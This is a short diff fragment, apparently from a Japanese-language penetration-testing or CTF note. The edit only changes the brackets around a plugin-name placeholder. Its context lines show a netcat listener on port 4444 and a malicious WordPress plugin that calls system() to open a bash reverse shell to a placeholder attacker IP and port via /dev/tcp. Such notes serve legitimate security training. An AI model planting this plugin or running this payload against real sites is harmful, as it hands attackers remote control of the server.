@@ -128,7 +128,7 @@ sudo rlwrap nc -lvnp 4444
 ```php
 <?php 
 	/*
-	Plugin Name: [プラグイン名]
+	Plugin Name: <プラグイン名>
 	*/
 
 system("bash -c 'bash -i >& /dev/tcp/[AttackerIP]/[Port] 0>&1'");
